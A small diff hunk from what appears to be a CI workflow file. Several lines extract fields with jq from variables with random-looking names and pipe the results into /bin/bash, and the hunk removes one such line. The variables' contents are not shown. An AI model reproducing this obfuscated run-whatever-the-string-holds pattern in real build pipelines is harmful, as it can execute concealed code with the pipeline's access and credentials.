@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$gfnk35" | jq -r .h1571 | /bin/bash
           printf '%s' "$hyq2" | jq -r .raj3 | /bin/bash
           printf '%s' "$klnf645" | jq -r .wor793 | /bin/bash
-          echo $ploma495 | jq -r .cwa526 | /bin/bash
           echo $cev370 | jq -r .ppzj6357 | /bin/bash
 
       - name: Save archive
